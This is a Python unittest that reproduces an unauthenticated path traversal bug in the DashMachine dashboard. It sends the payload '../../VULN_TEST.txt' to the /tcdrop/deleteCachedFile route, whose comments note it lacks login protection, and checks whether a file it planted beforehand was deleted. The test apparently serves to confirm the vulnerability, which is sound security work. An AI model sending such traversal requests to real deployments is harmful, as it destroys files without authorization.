
import os
import unittest
from dashmachine import app, db
from dashmachine.paths import dashmachine_folder

class TestVuln(unittest.TestCase):
    def setUp(self):
        self.client = app.test_client()
        self.target_file = os.path.join(dashmachine_folder, "VULN_TEST.txt")
        # Create a target file in the dashmachine root folder (2 levels up from cache)
        with open(self.target_file, "w") as f:
            f.write("delete me")

    def tearDown(self):
        if os.path.exists(self.target_file):
            os.remove(self.target_file)

    def test_path_traversal_delete(self):
        # The cache folder is in dashmachine/static/cache
        # We want to delete dashmachine/VULN_TEST.txt
        # So path is ../../VULN_TEST.txt (relative from cache)
        
        # Note: on Windows join might behave differently with / vs \ but python handles it?
        # Let's try standard traversal
        payload = "../../VULN_TEST.txt"
        
        print(f"Target file created at: {self.target_file}")
        print(f"Attempting to delete with payload: {payload}")
        
        # We need to bypass login? 
        # The route is NOT decorated with @login_required in routes.py lines 108-118!
        # It is exposed publicly!
        
        response = self.client.get(f"/tcdrop/deleteCachedFile?file={payload}")
        
        if os.path.exists(self.target_file):
            print("Vulnerability FAILED to reproduce: File still exists.")
        else:
            print("Vulnerability CONFIRMED: File was deleted.")

if __name__ == "__main__":
    unittest.main()
